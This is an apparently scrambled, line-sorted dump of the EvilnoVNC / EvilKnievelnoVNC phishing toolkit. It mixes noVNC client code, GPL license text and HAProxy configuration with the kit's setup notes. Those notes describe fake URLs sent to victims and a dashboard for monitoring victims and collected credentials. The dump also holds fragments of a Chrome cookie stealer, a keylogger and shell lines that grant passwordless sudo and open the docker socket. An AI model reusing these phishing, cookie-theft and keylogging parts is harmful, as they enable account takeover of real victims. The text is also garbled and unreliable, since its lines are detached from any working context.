        this._sock.sQpushString(this._rfbCredentials.target)
        this._sock.sQpushString(this._rfbCredentials.username)
        this._sock.sQpushString(user)
        this._supportsContinuousUpdates = false
        this._supportsFence = false
        this._supportsFence = true
        this._supportsSetDesktopSize = false
        this._supportsSetDesktopSize = true
        this._target = null
        this._target = target
        this._target = target 
        this._target.appendChild(this._screen)
        this._updateClip()
        this._updateConnectionState('connected')
        this._updateConnectionState('connecting')
        this._updateConnectionState('disconnected')
        this._updateConnectionState('disconnecting')
        this._updateContinuousUpdates()
        this._updatePosition()
        this._updateScale()
        this._updateVisibility(event.relatedTarget)
        this._updateVisibility(event.target)
        this._updateVisibility(target)
        this._viewOnly = false
        this._viewOnly = viewOnly
        this._viewportDragPos = {}
        this._viewportDragging = false
        this._viewportHasMoved = false
        this._wsProtocols = options.wsProtocols 
        this.clear()
        this.dispatchEvent(event)
        this.dispatchEvent(new CustomEvent(
        this.dragViewport = false
        this.focus({ preventScroll: true })
        this.focusOnClick = true
        this.onkeyevent = () => {}
        try {
        try:
        url 
        url = UI.getSetting('encrypt') 
        usernameBytes[username.length] = 0
        while (this._FBU.rects > 0) {
        window.crypto.getRandomValues(passwordBytes)
        window.crypto.getRandomValues(usernameBytes)
        window.requestAnimationFrame(() => {
        xhr.send()
        }
        }                                                                                                                                                                                                                                      
        } catch (e) {
        } catch (err) {
        } catch (exc) {
        } else  {
        } else if (!hasScrollbarGutter) {
        } else if (cursorType == 1) {
        } else if (depth > 8) {
        } else if (newLen < 1) {
        } else if (newY > controlbarBounds.top 
        } else if (ptr.clientX > (window.innerWidth 
        } else if (typeof ctrl.options !== 'undefined') {
        } else {
        } else {                                                                                                                                                                                                                               
        })
       // Formats
       // Windows AltGr detection
       //a
       to fire properly for the target element so we have
       to listen on the document element instead.
      // disconnection timer
      ]
      end
      if pattern 
      pattern = M.build_pattern(allowed_origin)
      return true
      return wildcard_origin
      { credentials: { password: password } })
     // resize rate limiting
     /INIT
     MISC
     POWER
     RESIZE
     VISUAL
     https://darkbyte.net    
    (at your option) any later version.
    )[0]
    -- add the generic scheme to the beginning of the pattern
    -- an asterisk for the port means allow all ports
    -- append end character
    -- escape dots and dashes in pattern
    -- if wildcard (
    /
    // ===== PRIVATE METHODS =====
    // ===== PROPERTIES =====
    // ===== PUBLIC METHODS =====
    // Adds a link to the label elements on the corresponding input elements
    // Apply remote resizing or local scaling
    // Disable/enable controls depending on connection state
    // Disable/enable power button
    // Gets the the size of the available screen
    // Initial page load read/initialization of settings
    // Message Handlers
    // Move the handle but don't allow any position outside the bounds
    // Read form control compatible setting from cookie
    // Render default UI and initialize settings menu
    // Requests a change of remote desktop size. This message is an extension
    // Resize observer object
    // Resume authentication handshake after it was paused for some
    // Save control setting to cookie
    // Send a key press. If 'down' is not specified then send a down key
    // Should we currently display the cursor
    // These helpers compensate for the lack of parent-selectors and
    // This code is required since some browsers on Android are inconsistent in
    // Update viewport clipping property for the connection. The normal
    // Used to build Notify and Request data.
    // and may only be sent if we have received an ExtendedDesktopSize message
    // authentication
    // case is to get the value from the setting. There are special cases
    // configured viewport matches the current screen size
    // different cursor set)
    // disable the labels that belong to disabled input elements.
    // followed by an up key.
    // for when the viewport is scaled or when a touch device is used.
    // id
    // moving the cursor in such cases
    // previous-sibling-selectors in CSS which are needed when we want to
    // sending keyCodes in the normal keyboard events when using on screen keyboards.
    // the keyboardinput element instead and generate the corresponding key events.
    // unless the optional parameter changeFunc is used instead.
    // updates from control to current cookie setting.
    //Helper to add options to dropdown.
    //b
    //document.removeChild(document.documentElement)
    //g
    //r
    /MISC
    /POWER
    /RESIZE
    /VISUAL
    7.  This requirement modifies the requirement in section 4 to
    <one line to give the program's name and a brief idea of what it does.>
    <program>  Copyright (C) <year>  <name of author>
    <style>
    >/dev/null 
    Appropriate Legal Notices
    Copyright (C) <year>  <name of author>
    Corresponding Source along with the object code.  If the place to
    Corresponding Source fixed on a durable physical medium
    Corresponding Source from a network server at no charge.
    Corresponding Source in the same way through the same place at no
    Corresponding Source.  Regardless of what server hosts the
    GNU General Public License for more details.
    KEYBOARD
    License to anyone who comes into possession of a copy.  This
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Notices displayed by works containing it
    PANELS
    QUALITY
    SETTINGS
    Since 
    Source of the work are being offered to the general public at no
    This program comes with ABSOLUTELY NO WARRANTY
    This program is free software: you can redistribute it and/or modify
    UI.prime()
    VIEWDRAG
    You should have received a copy of the GNU General Public License
    _allKeysUp() {
    _captureIsActive() {
    _clientHasExpectedSize() {
    _connect() {
    _currentClientSize() {
    _disconnect() {
    _fail(details) {
    _fixScrollbars() {
    _focusCanvas(event) {
    _framebufferUpdate() {
    _getKeyCode(e) {
    _handleAltGrTimeout() {
    _handleCursor() {
    _handleDataRect() {
    _handleDelayedMouseMove() {
    _handleDesktopName() {
    _handleExtendedDesktopSize() {
    _handleGesture(ev) {
    _handleKeyDown(e) {
    _handleKeyUp(e) {
    _handleMessage() {
    _handleMouse(ev) {
    _handleMouseLeave(event) {
    _handleMouseMove(event) {
    _handleMouseOver(event) {
    _handleMouseUp(event) {
    _handleRSAAESCredentialsRequired(event) {
    _handleRSAAESServerVerification(event) {
    _handleRect() {
    _handleResize() {
    _handleSecurityReason() {
    _handleSecurityResult() {
    _handleServerCutText() {
    _handleServerFenceMsg() {
    _handleSetColourMapMsg() {
    _handleVMwareCursor() {
    _handleWheel(ev) {
    _handleXvpMsg() {
    _hideCursor() {
    _initMsg() {
    _isSupportedSecurityType(type) {
    _negotiateARDAuth() {
    _negotiateAuthentication() {
    _negotiateMSLogonIIAuth() {
    _negotiatePlainAuth() {
    _negotiateProtocolVersion() {
    _negotiateRA2neAuth() {
    _negotiateSecurity() {
    _negotiateServerInit() {
    _negotiateStdVNCAuth() {
    _negotiateTightAuth() {
    _negotiateTightTunnels(numTunnels) {
    _negotiateTightUnixAuth() {
    _negotiateVeNCryptAuth() {
    _negotiateXvpAuth() {
    _normalMsg() {
    _refreshCursor() {
    _requestRemoteResize() {
    _resumeAuthentication() {
    _saveExpectedClientSize() {
    _screenSize() {
    _sendEncodings() {
    _setClippingViewport(on) {
    _setDesktopName(name) {
    _shouldShowCursor(target) {
    _shouldShowDotCursor() {
    _showCursor() {
    _socketClose(e) {
    _socketError(e) {
    _socketOpen() {
    _updateClip() {
    _updateConnectionState(state) {
    _updateContinuousUpdates() {
    _updatePosition() {
    _updateScale() {
    _updateVisibility(target) {
    a) Disclaiming warranty or limiting liability differently from the
    a) The work must carry prominent notices stating that you modified
    activateControlbar(event) {
    addClipboardHandlers() {
    addConnectionControlHandlers() {
    addControlbarHandlers() {
    addExtraKeysHandlers() {
    addFullscreenHandlers() {
    addMachineHandlers() {
    addSettingsHandlers() {
    addTouchSpecificHandlers() {
    any liability that these contractual assumptions directly impose on
    applyResizeMode() {
    approveServer() {
    approveServer(e) {
    async serverVerify(e) {
    attach(target) {
    author attributions in that material or in the Appropriate Legal
    authors of the material
    available for as long as needed to satisfy these requirements.
    b) Requiring preservation of specified reasonable legal notices or
    b) The work must carry prominent notices stating that it is
    bell(e) {
    blur() {
    but WITHOUT ANY WARRANTY
    c) Convey individual copies of the object code with a copy of the
    cancelReconnect() {
    charge under subsection 6d.
    clear directions next to the object code saying where to find the
    clear() {
    clipboardClear() {
    clipboardPasteFrom(text) {
    clipboardReceive(e) {
    clipboardSend() {
    closeAllPanels() {
    closeClipboardPanel() {
    closeConnectPanel() {
    closeControlbar() {
    closeExtraKeys() {
    closePowerPanel() {
    closeSettingsPanel() {
    connectFinished(e) {
    const password = 'false'
    const re = new RegExp('.
    constructor() {
    constructor(target) {
    controlbarHandleMouseDown(e) {
    controlbarHandleMouseUp(e) {
    copy of the Corresponding Source for all the software in the
    credentials(e) {
    cursor = db.cursor()
    customarily used for software interchange.
    d) Convey the object code by offering access from a designated
    d) Limiting the use for publicity purposes of names of licensors or
    db = sqlite3.connect(filename)
    db.close()
    db.commit()
    decrypted = cipher.decrypt(encrypted_value)
    decrypted_value = (clean(decrypted))
    def clean(x): 
    desktopName = e.detail.name
    detach() {
    disableSetting(name) {
    disconnect() {
    disconnectFinished(e) {
    dot: {
    dragControlbarHandle(e) {
    e) Declining to grant rights under trademark law for use of some
    echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
    else:
    enableSetting(name) {
    encrypted_value = encrypted_value[3:]
    end
    except EnvironmentError:
    f) Requiring indemnification of licensors and authors of that
    fetch('app/locale/' 
    focus(options) {
    from '../core/util/browser.js'
    further charge.  You need not require recipients to copy the
    get background() { return this._screen.style.background
    get capabilities() { return this._capabilities
    get clipViewport() { return this._clipViewport
    get clippingViewport() { return this._clippingViewport
    get compressionLevel() {
    get qualityLevel() {
    get resizeSession() { return this._resizeSession
    get scaleViewport() { return this._scaleViewport
    get showDotCursor() { return this._showDotCursor
    get touchButton() { return 0
    get viewOnly() { return this._viewOnly
    getImageData() {
    getSetting(name) {
    git clone --depth=1 https://github.com/novnc/noVNC.git /home/user/noVNC 
    git clone --depth=1 https://github.com/novnc/websockify /home/user/noVNC/utils/websockify 
    grab() {
    hideStatus() {
    hideVirtualKeyboard() {
    idleControlbar() {
    if (match) {
    if M.specifies_scheme(pattern) == false and M.specifies_generic_scheme(pattern) == false and M.begins_with_dot(pattern) == false then
    if allowed_origin 
    if chromedate != 86400000000 and chromedate:
    if item == test_str then
    if wildcard_origin 
    initFullscreen() {
    initSettings() {
    invalidate such permission if you have separately received it.
    it under the terms of the GNU General Public License as published by
    iterations = 1
    iv = b' ' 
    keepControlbar() {
    keepVirtualKeyboard(event) {
    keyInput(event) {
    keyboardinputReset() {
    length = 16
    long as you offer spare parts or customer support for that product
    machineReboot() {
    machineReset() {
    machineShutdown() {
    main()
    material by anyone who conveys the material (or modified versions of
    may be on a different server (operated by you or a third party)
    more than your reasonable cost of physically performing this
    moveControlbarHandle(viewportRelativeY) {
    msg = 'Error while catching events:  {}'.format(ex)
    my_pass = 'peanuts'
    my_pass = my_pass.encode('utf8')
    new_hook.start()
    none: {
    onblurVirtualKeyboard(event) {
    onfocusVirtualKeyboard(event) {
    openClipboardPanel() {
    openConnectPanel() {
    openControlbar() {
    openExtraKeys() {
    openPowerPanel() {
    openSettingsPanel() {
    os.environ.get(
    os.path.expanduser('/home/user/Downloads/keylog.txt')
    pass
    prime() {
    pyxhook.print_err(msg)
    reasonable ways as different from the original version
    reconnect() {
    regardless of how they are packaged.  This License gives no
    rejectServer(e) {
    released under this License and any conditions added under section
    requiring that modified versions of such material be marked in
    return
    return decrypted_value
    return defaultValue
    return pattern
    rfb.sendCredentials({ password: password })
    rm -rf /home/user/noVNC/.git 
    rm -rf /home/user/noVNC/utils/websockify/.git 
    salt = b'saltysalt'
    saveSetting(name) {
    securityFailed(e) {
    sendCredentials(creds) {
    sendCtrlAltDel() {
    sendEsc() {
    sendTab() {
    set background(cssValue) { this._screen.style.background = cssValue
    set clipViewport(viewport) {
    set compressionLevel(compressionLevel) {
    set qualityLevel(qualityLevel) {
    set resizeSession(resize) {
    set scaleViewport(scale) {
    set showDotCursor(show) {
    set viewOnly(viewOnly) {
    setCredentials(e) {
    setupSettingLabels() {
    showControlbarHint(show) {
    showVirtualKeyboard() {
    start() {
    sudo apk del git
    terms of sections 15 and 16 of this License
    those licensors and authors.
    toggleAlt() {
    toggleClipboardPanel() {
    toggleControlbar() {
    toggleControlbarSide() {
    toggleCtrl() {
    toggleExpander(e) {
    toggleExtraKeys() {
    toggleFullscreen() {
    togglePowerPanel() {
    toggleSettingsPanel() {
    toggleViewDrag() {
    toggleVirtualKeyboard() {
    toggleWindows() {
    try:
    under certain conditions
    ungrab() {
    updateCompression() {
    updateControlbarHandle() {
    updateDesktopName(e) {
    updateFullscreenButton() {
    updateLogging() {
    updatePowerButton() {
    updateQuality() {
    updateSetting(name) {
    updateShowDotCursor() {
    updateViewClip() {
    updateViewDrag() {
    updateViewOnly() {
    updateVisualState(state) {
    url 
    url = 'ws'
    url = 'wss'
    wildcard_origin = M.wildcard_origin_allowed(allowed_origins)
    window.location.replace(targetURL)
    with subsection 6b.
    work need not make them do so.
    written offer to provide the Corresponding Source.  This
    you inform other peers where the object code and Corresponding
    {
    }
   / / 
   // DH base generator value
   /EXTRA KEYS
   /KEYBOARD
   /PANELS
   /QUALITY
   /SETTINGS
   /VIEWDRAG
   Authentication
   CLIPBOARD
   ClientInitialization - not triggered by server message
   EXTRA KEYS
   EvilnoVNC by @JoelGMSec   
   FULLSCREEN
   PASSWORD
   ProtocolVersion
   Security
   SecurityResult
   ServerInitialization
   connected
   connecting
   disconnected - permanent state
   disconnecting
  (1<<0)  - BlockBefore
  (1<<1)  - BlockAfter
  (1<<2)  - SyncNext
  (1<<31) - Request
  -- Bail if client did not send an Origin
  -- remove spaces
  ---------------- by @JoelGMSec --------------
  // Padding
  // We finished this FBU
  // hotspot-x
  // hotspot-y
  // number-of-screens
  // padding
  // predetermined prime modulus
  // wait until we receive the sub auth to continue
  //b
  /CLIPBOARD
  /COMPRESSION
  /CONNECTION
  /FULLSCREEN
  /PASSWORD
  0 - server resized on its own
  0. Definitions.
  1 - this client requested the resize
  1. Source Code.
  10. Automatic Licensing of Downstream Recipients.
  11. Patents.
  12. No Surrender of Others' Freedom.
  13. Use with the GNU Affero General Public License.
  14. Revised Versions of this License.
  15. Disclaimer of Warranty.
  16. Limitation of Liability.
  17. Interpretation of Sections 15 and 16.
  2 - another client requested the resize
  2. Basic Permissions.
  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
  4. Conveying Verbatim Copies.
  5. Conveying Modified Source Versions.
  6. Conveying Non-Source Forms.
  7. Additional Terms.
  8. Termination.
  9. Acceptance Not Required for Having Copies.
  A compilation of a covered work with other separate and independent
  AUTHENTICATED SESSION
  All rights granted under this License are granted for the term of
  COMPRESSION
  CONNECTION
  Conveying under any other circumstances is permitted solely under
  Developers that use the GNU GPL protect your rights with two steps:
  Each version is given a distinguishing version number.  If the
  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
  If the Program specifies that a proxy can decide which future
  If the disclaimer of warranty and limitation of liability provided
  Later license versions may give you additional or different
  No covered work shall be deemed part of an effective technological
  Nothing in this License shall be construed as excluding or limiting
  Some devices are designed to deny users access to install or run
  Termination of your rights under this section does not terminate the
  The Corresponding Source for a work in source code form is that
  The Corresponding Source need not include anything that users
  The Free Software Foundation may publish revised and/or new versions of
  The GNU General Public License does not permit incorporating your program
  The licenses for most software and other practical works are designed
  The requirement to provide Installation Information does not include a
  You are not required to accept this License in order to receive or
  You may convey a covered work in object code form under the terms
  You may convey verbatim copies of the Program's source code as you
  You may not impose any further restrictions on the exercise of the
  You may not propagate or modify a covered work except as expressly
  _____       _ _          __     ___   _  ____
  else
  end
  if allowed_origin == nil then
  if origin 
  if origin == nil or origin == '' then
  if pattern 
  if transaction_data == nil then
  local headers = txn.http:req_get_headers()
  local method = txn.sf:method()
  local origin = nil
  local reply = txn:reply()
  local transaction_data = txn:get_priv()
  local transaction_data = {}
  pattern = M.trim(pattern)
  return false
  return nil
  txn:done(reply)
  txn:set_priv(transaction_data)
 !!options.shared : true
 !UI.controlbarDrag) {
 !UI.inhibitReconnect) {
 !document.cookie) return
 !this._enabledContinuousUpdates) {
 !this._viewportDragging) {
 $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']
 $auth_cnt
 $click_cnt 
 $i < $length
 $shell run.sh 
 $subm_cnt
 $subm_cnt 
 $subm_cnt))
 '.json')
 '=([
 '_ 
 'wss' : 'ws'
 'x' 
 ((code === 'ShiftLeft') 
 ((this._rfbVersion 
 (1000
 (1<<1)
 (1<<31))) {
 (4 
 (BETA)
 (Math.abs(deltaX) > dragThreshold 
 (_) 
 (code === 'CapsLock')) {
 (down 
 (e.button != 0)) return
 (ev.type === 'contextmenu')) {
 (h === 0)) {
 (numberOfScreens 
 (see above)
 ------
 ------v------
 -inputs : 0
 -lt 1 ] 
 -lt 2 ]]
 .slider { background-color: 
 .slider:before { transform: translateX(16px)
 / /
 / / 
 / _ 
 // '
 // Actions
 // Assumed pixels for one line step
 // ClientInitialisation
 // Handler for key press/release
 // Padding
 // Pixels needed for one step
 // Update our format flags
 // Will be decreased when we return
 // alternative standard method
 // assuming admin access
 // blue-max
 // blue-shift
 // break
 // capNum
 // connect
 // continue
 // currently working methods
 // flags
 // green-max
 // green-shift
 // htmlspecialchars!
 // in minutes
 // little-endian
 // msg-type
 // number-of-screens
 // other party's public key
 // padding
 // red-max
 // red-shift
 // refresh every x seconds
 // requires UI.rfb
 // reset
 // sed uses same dir for temp file... -> copy
 // sub msg-type
 // use NOTUNNEL
 // wait until we receive the sub auth count to continue
 // x-position
 // y-position
 //Padding
 //This is sent to the UI
 //a
 //g
 //r
 /EVENT HANDLERS
 /SERVER VERIFY
 /VIEW CLIPPING
 0.1)) {
 0.9)) {
 0x0000FFFF
 0x00ff)
 0x80
 0x80 
 0xFF))
 0xFF000000
 0xff
 1 : 0)
 1 ] = 0x00
 1 ] = data >> 16 
 1 ] = g
 1. run controller in screen session
 10) % 10)
 1000 
 1000)
 16)
 1] = formats[formatKeys[i]] >> 16
 1] = pixels[pixIdx 
 2 ] = 0x00
 2 ] = b
 2 ] = data >> 8 
 2)) {
 2. run haproxy in screen session
 255 : 0
 2] = formats[formatKeys[i]] >> 8
 2] = pixels[pixIdx]
 3 ] = 0x00
 3 ] = 0xff
 3 ] = data 
 3. run EvilnoVNC instances in screen session
 30 mins
 3] = alpha
 3] = formats[formatKeys[i]] >> 0
 4) 
 4)     ] = data >> 24 
 </div><div id=challenge-fact-wrapper style=display:block
 <div id=trk_jschal_js style=display:none
 === Checkbox Slider === 
 === Scrollbar CSS === 
 ==============
 Advanced Usage
 BUILD 
 Banner
 CLEANUP
 CONFIGURATION
 Checking if the site connection is secure
 Chromium extension inside noVNC that monitors the victim's activity
 Code from: https://www.thepythoncode.com/article/extract-chrome-cookies-python
 Connection name/title 
 Connection states:
 Contact
 Cookie Stealer for EvilnoVNC
 Copyright (C) 2019 The noVNC Authors
 Copyright (C) 2020 The noVNC Authors
 Credits and Acknowledgments
 Decrypt function from: https://n8henrie.com/2014/05/decrypt-chrome-cookies-with-python
 Default values used by both Chrome and Chromium in OSX and Linux
 DevTools):
 Download
 EVENT HANDLERS
 Encodings are signed 
 Everyone is permitted to copy and distribute verbatim copies
 EvilKnievelnoVNC
 EvilnoVNC
 FORMER startVNC.sh 
 FROM cookies
 Features
 Features 
 Fence flags
 Firefox 
 From: https://github.com/nandydark/Linux-keylogger
 Function to get rid of padding
 HAproxy used as loadbalancer and gatekeeper
 Help 
 License
 Licensed under MPL 2.0 (see LICENSE.txt)
 Licensed under MPL 2.0 or any later version (see LICENSE.txt)
 Main function
 Math.ceil(w / 8) 
 Math.floor(x / 8)
 New FramebufferUpdate 
 Note: This is only needed for the 'click' event as it fails
 Only ISO 8859-1 is supported 
 PAGE_TITLE
 PIXEL_FORMAT 
 PIXEL_MASK) ==
 PROD:
 Populate the controls if defaults are provided in the URL 
 Print errors and disconnect
 REQID=$(head -1 ./tmp/reqid$SID.txt)
 RFB protocol initialization states:
 RFB.cursors.dot : this._cursorImage
 RUN
 Remove all dangling images
 Requirements
 Restore permissions of docker socket
 Running on multiple Docker containers with internal networking
 SERVER VERIFY
 SETTINGS (panel)
 SETUP
 Safari doesn't support alphanumerical input while in fullscreen
 Screen size 
 See Also
 See README.md for usage and integration instructions.
 Setup
 Support
 TEST (show Chromium GUI 
 TODO config not found... necessary
 Technical Overview
 The detailed guide of use can be found at the following link:
 The parameter 'details' is used for information that
 The x-position indicates the reason for the change:
 To Do
 To Do List
 Trim off the 'v10' that Chrome/ium prepends
 UI.defaultKeyboardinputLen) {
 UI.desktopName
 UI.rfb.dragViewport) {
 URL=$(head -1 php.ini 
 USERA=$(head -1 ./tmp/useragent$SID.txt)
 Usage
 V /
 V / 
 VIEW CLIPPING
 Variables
 We don't check connection status or viewOnly here as the
 [CuddlePhish](https://github.com/fkasler/cuddlephish) using WebRTC
 [MultiEvilnoVNC](https://github.com/wanetty/MultiEvilnoVNC)
 [NoPhish](https://github.com/powerseb/NoPhish)
 ____
 a victim's user agent is replicated
 access to EvilnoVNC sessions is limited to generated URLs with random victim-specific identifier in parameter
 actions)
 add Squid proxy for accessing target sites over same IP when Chromium profile has been copied to admin
 add an email address per victim
 add backend entries
 add backend novnc entries
 add backend rules per instance
 add instance entries to haproxy.cfg
 add reqid to haproxy whitelist (live)
 admin dashboard
 admin pw for dashboard
 already decrypted
 and each file should have at least
 and give all
 and make session cookie persistent
 arguments given
 as Log from '../core/util/logging.js'
 as Log from '../util/logging.js'
 as Log from './util/logging.js'
 authType 
 authType)
 autoconnect == '1') {
 base64url_enc(loot))
 bash run.sh'
 bigEndian 
 bit mask to RGBA
 block clients with reqid in blacklist (already authenticated)
 blocking users on successful login requires at least one defined search string (EvilnoVNC/Files/content.js)
 blueMax 
 blueShift)
 bpp 
 browser.isIOS()) 
 browser.isIOS()) {
 browser.isWindows() 
 build
 build 
 build EvilnoVNC run.sh from template
 build and run EvilKnievelnoVNC after setup via setup.sh
 build haproxy config from template
 build haproxy run script
 build phishboard/index.php
 build pishboard/interact.php
 build run.sh from template
 by default a self-signed TLS certificate will be presented (CN: testing-server) with the following fingerprints
 bytesPerPixel)
 bytesPerPixel) 
 bytesPerPixel)     ] = 0x00
 bytesPerPixel)     ] = r
 capslock)
 caution
 certandkey.pem built from cert.pem and privatekey.pem
 char.charCodeAt()
 check for dependencies
 check screen dependency
 chpasswd 
 cleanup generated and collected data via ./setup.sh clean
 clientSupportedTunnelTypes[0])
 clone repo to server
 close connection
 code 
 code !== 'MetaLeft' 
 code !== 'MetaRight')) {
 collected credentials
 color: 
 combined cert
 commit changes
 compressionLevel < 0 
 compressionLevel > 9) {
 connect to the database
 consider customizing the error page when users get bocked (EvilnoVNC/Files/vnc_light.html)
 consider customizing the name of the identifier URL parameter (haproxy/haproxy.cfg and controller/src/
 consider customizing the preloading page to fit to the target site (EvilnoVNC/Files/index.php)
 consider running controller and haproxy manually with their respective run.sh for debugging and insights
 controlbarBounds.height === 0) {
 create docker internal network
 create dynamic files
 ctrl.type === 'checkbox') {
 cursorType 
 customize variables in setup.sh
 cversion 
 cversion)
 d.toUTCString()
 dbus-uuidgen > /var/lib/dbus/machine-id
 define TCP port for administrative access
 define URL of your server (fake URL sent to victims)
 define access token for administrative access to instances
 define number of concurrent EvilnoVNC instances
 define own TLS certificate
 define path to TLS cert
 define target URL where victims effectively log in to
 define timezone
 deflatedData.length)
 depth 
 details)
 detect admins and redirect to admin backend (phisboard and direct access to sessions)
 do sleep .3
 do sleep 1
 do sleep 30 
 do sleep 32 
 do sleep 4 
 do sleep 5
 do some dbus stuff
 document.hasFocus()) {
 done
 done 
 dynamic resolution mode with preloading page is currently the default
 e.code
 e.keyCode
 e.reason
 echo $cfg
 echo $dash1
 echo $dash2
 echo $erun
 echo $hrun
 echo ./$run
 err)
 err))
 eslint-disable indent 
 eslint-enable indent 
 exc)
 exit 1
 exit 1)
 extendedClipboardActionCaps))
 extendedClipboardFormatText) {
 extendedClipboardFormatText)) {
 font-weight: bold
 for a reset stop all containers and run 
 for controller to control EvilnoVNC containers
 for details type 
 format) {
 formatKeys.length))
 get the AES key
 get the cookies from 
 get title of target site and set it to our victim page
 getting keystrokes or pasted text from victim session
 greenMax 
 greenShift 
 grep $reqid 
 grep $svrname 
 grep -v grep 
 grep -v while >/dev/null) ]
 grep docker 
 grep keylog 
 haproxy.cfg template
 height 
 host
 host)
 htmlspecialchars($_GET[$var])  : null
 htmlspecialchars($_POST[$var]) : null
 htmlspecialchars($_SERVER[$var]) : null
 https://wiki.alpinelinux.org/wiki/Docker
 i < actions.length
 i < backspaces
 i < ctrl.options.length
 i < encodings.length
 i < formatKeys.length
 i < formats.length
 i < labels.length
 i < llevels.length
 i < newLen
 i < numTunnels
 i < numberOfScreens
 i < password.length
 i < subAuthCount
 i < textData.length
 i < this._cursorImage.rgbaPixels.length
 i < this._rfbVeNCryptSubtypesLength
 i < username.length
 i <= 15
 i <= 31
 i<=$instances
 i] = password.charCodeAt(i)
 id 
 ignore decoding errors
 index)
 index)) {
 input.name) {
 input.value 
 inputVal
 inputVal)
 is a Ready to go Phishing Platform. 
 isTouchDevice
 it applies also to
 j < children.length
 j < text.length
 jpBadKeys.includes(keysym)) {
 keysym 
 keysym)
 l10n.dictionary !== undefined) {
 l10n.language 
 length 
 ln -s /usr/bin/python3 /usr/bin/python
 local sqlite Chrome cookie database path
 loot)
 lowerByte < 0x7f) {
 major 
 margin
 margin 
 margin) {
 margin: 10px 12px
 masklength
 maximum amount of instances (>=300 MB of RAM per active session)
 min-height: 60px
 minor == 2)) {
 minor)
 monitor active victims in real-time
 mouse events might be used to control the viewport
 msg)
 msgType 
 name 
 name)
 nameLength)) { return false
 nc hap 8000 
 nginx for simple dashboard
 no ending slash! e.g. https://example.com
 noVNC: HTML5 VNC client
 null
 num 
 numClientMessages 
 numClientMessages)
 numEncodings)
 numEncodings) 
 numServerMessages)
 numlock 
 object from a chrome format datetime
 oldstate 
 oldstate !== 'connecting') {
 oldstate)
 op 
 optional/internal settings
 or run each container manually with its 
 overview of phishing campaign progress
 padding: 0
 parentRelativeY 
 password.length] = 0
 path
 path=/
 pixel
 pixel < (w 
 port
 prepare Loot dir
 prepare download dir
 prepare loot und keylogger
 prepare site
 qualityLevel < 0 
 qualityLevel > 9) {
 rate limiting: block if more than 10 concurrent connections
 read URL from file (env)
 real dynamic resolution: adapt noVNC canvas when victim changes their window size
 reason 
 rebuild admin dashboard
 redMax 
 redShift 
 regularly store collected data
 remove --rm if no modifications to image
 remove X display lock
 reqid
 request.responseText)
 request.status < 300) {
 res)
 resString)
 response.status 
 response.statusText)
 run
 run EvilnoVNC instances
 run centrally with 
 run controller
 run haproxy/backend
 run setup.sh from its directory (
 scancode)
 scancode) {
 section 10
 send all targets to the novnc backend
 send the generated URLs to the victims and monitor the activity in the dashboard
 server should be reachable via a phishing domain with valid TLS certificate
 server.sh
 serverName 
 serverSupportedTunnelTypes)
 serverSupportedTypes)
 set permissions
 set target URL in php.ini for getting the title
 setup script for EvilKnievelnoVNC
 sha1 
 sha256 
 should be logged but not sent to the user interface.
 show delayed via js 
 shutdown sessions server novnc/s$svrno' 
 size.h)
 start PHP for static page reading resolution
 start X server with chromium (quicker start in kiosk.sh)
 start X with given resolution
 start kiosk.sh in background
 start x11vnc and novnc_proxy
 state 
 state !== 'disconnecting') {
 state)
 stop PHP and redirect traffic to noVNC port
 stops all running docker containers!
 stress test implementation for lots of concurrent activity (feedback is welcome)
 subtypes 
 sudo chmod 666 /var/run/docker.sock
 sudo chmod 777 -R Downloads 
 sudo chmod 777 kiosk.zip
 sudo chown -R 103 Downloads
 sudo cp -R -u /root/.config/chromium/Default /home/user/Downloads/ 
 sudo cp -R -u /root/Downloads/ /home/user/Downloads/ 
 sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address
 sudo python3 cookies.py > Downloads/Cookies.txt 
 sudo python3 cookies.py > Downloads/cookies.txt 2>> errorlog.txt
 sudo python3 keylogger.py 2>> errorlog.txt
 sversion)
 svr_op_state:
 table
 target and phishing domain
 text-align: right
 then
 there needs to be at least another container running before haproxy is started! (haproxy limitation)
 this._FBU.y !== 0) {
 this._clipViewport) {
 this._compressionLevel)
 this._hotSpot.x
 this._hotSpot.x - hotx
 this._hotSpot.y
 this._hotSpot.y - hoty
 this._qualityLevel)
 this._repeaterID
 this._rfbAuthScheme)
 this._rfbVeNCryptSubtypesLength)) { return false
 this._rfbXvpVer 
 this._sock.rQpeekBytes(30))
 this._viewOnly 
 this._viewOnly) { return
 timedelta(microseconds=chromedate)
 true 
 trueColor 
 type 
 types 
 types)
 update the cookies table with the decrypted value
 url 
 url)
 usage
 usage: ./setup clean
 use responsibly and only in legal manners
 username is ekadmin
 val 
 val !== null 
 val)
 values with ---val--- will get replaced by setup.sh
 ver 
 victim actions are logged to accesslog.txt and submitlog.txt
 victim data and statistics is stored in a central targets.json
 victims can paste text to noVNC via dirty trick
 wait for victim resolution to be written to disk
 wait until X display is created
 wc -l) > 0 )) 
 we're past the point where we could backtrack
 webdevops/php-nginx 
 when running EvilKnievelnoVNC the admin dashboard is reachable via the defined URL and basic auth credentials (<URL>/phishboard)
 width 
 width: 330px
 width: auto
 window.innerHeight 
 window.visualViewport.offsetLeft
 window.visualViewport.offsetTop
 without even the implied warranty of
 write resolution to chromium.conf and add custom profile dir
 x < w
 x11vnc -storepasswd false /home/user/.vnc/passwd 
 xvpMsg 
 y < h
 { margin: 0
 { path /websockify } 
 { path_beg /phishboard }
 { path_end .js }
 { path_end .js } 
 { urlp(reqid) -f /etc/whitelist.acl } 
 }                                                                                                                                                    
!/bin/bash
!/usr/bin/python3
![Logo](img/logo.png)
![dashboard](img/dashboard.png)
![targets](img/targets.png)
"                                                 this._fbWidth, this._fbHeight)"
"                                             this._fbWidth, this._fbHeight)"
"                                          ""(scheme: "" "
"                                        false, 1 << ev.button)"
"                                        true, 1 << ev.button)"
"                                      this._FBU.width, this._FBU.height,"
"                                      this._gestureFirstDoubleTapEv.detail.clientY,"
"                                      this._sock, this._display,"
"                                    Math.floor(size.w), Math.floor(size.h),"
"                                    this._screenID, this._screenFlags)"
"                                   'ShiftLeft', false)"
"                                   'ShiftRight', false)"
"                                  ""vendor or signature"")"
"                                  this._display.absY(y), mask)"
"                                if($s[""reqid""] === $id) return $s[""userid""]"
"                                this._handleMouseButton(pos.x, pos.y, false, 0x10)"
